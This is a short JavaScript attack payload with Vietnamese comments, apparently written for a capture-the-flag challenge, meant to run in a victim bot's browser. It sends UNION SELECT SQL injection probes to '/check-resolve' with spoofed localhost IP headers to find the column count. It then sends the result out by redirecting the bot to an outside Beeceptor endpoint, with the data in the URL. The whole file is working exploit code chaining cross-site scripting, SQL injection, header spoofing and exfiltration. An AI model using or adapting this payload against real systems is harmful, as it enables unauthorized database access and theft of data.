// Dùng hàm async để chờ từng request chạy xong mới chạy tiếp
(async function() {
    for (let i = 1; i <= 10; i++) {
        // Tạo chuỗi UNION: 1, 2, 3... cho đến i
        let cols = Array.from({length: i}, (_, idx) => idx + 1).join(', ');
        let formData = new URLSearchParams();
        formData.append('id', '-1 UNION SELECT ' + cols);

        try {
            // Đợi fetch chạy xong
            let response = await fetch('/check-resolve', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'Client-IP': '127.0.0.1'
                },
                body: formData.toString()
            });
            
            let data = await response.text();
            
            // Nếu kết quả KHÔNG CHỨA chữ "error" -> Chúng ta đã trúng Jackpot!
            if (!data.includes('error')) {
                // Ép Bot chuyển hướng về Beeceptor, mang theo số cột đúng và dữ liệu
                window.location = 'https://khanh.free.beeceptor.com/?cot_dung_la=' + i + '&data=' + encodeURIComponent(data);
                return; // Thoát hàm ngay lập tức
            }
        } catch (e) {
            // Kệ lỗi mạng, chạy tiếp vòng lặp
        }
    }
    
    // Nếu quét từ 1 đến 10 vẫn tịt ngòi (đề phòng)
    window.location = 'https://khanh.free.beeceptor.com/?error=quet_tu_1_den_10_deu_that_bai';
})();